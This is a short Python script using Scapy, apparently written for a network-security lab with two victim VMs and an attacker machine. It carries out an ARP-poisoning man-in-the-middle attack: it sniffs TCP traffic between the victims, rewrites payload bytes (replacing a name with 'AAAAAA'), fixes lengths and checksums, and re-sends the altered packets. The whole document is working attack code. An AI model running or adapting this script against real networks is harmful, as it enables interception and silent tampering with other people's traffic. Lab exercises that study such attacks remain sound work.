from scapy.all import *
import re
from ARP_POISON import arp_poison
VM_B_IP = '10.0.2.14'
VM_A_IP = '10.0.2.13'
VM_B_MAC = '08:00:27:7b:88:b1'
VM_A_MAC = '08:00:27:70:0c:00'
ATTACKER_IP = '10.0.2.8'
ATTACKER_MAC = '08:00:27:17:de:fa'
def spoof_pkt(pkt):
    arp_poison(VM_A_IP, VM_A_MAC, VM_B_IP, VM_B_MAC, ATTACKER_IP, ATTACKER_MAC)
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
        payload_before = len(pkt[TCP].payload)
        real = pkt[TCP].payload.load
        data = real.replace(b'Anurag',b'AAAAAA')
        payload_after = len(data)
        payload_dif = payload_after-payload_before
        newpkt = IP(pkt[IP])
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        newpkt[IP].len = pkt[IP].len + payload_dif
        newpkt = newpkt/data
        send(newpkt, verbose = False)
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
        newpkt = pkt[IP]
        send(newpkt, verbose = False)
pkt = sniff(filter='tcp',prn=spoof_pkt) 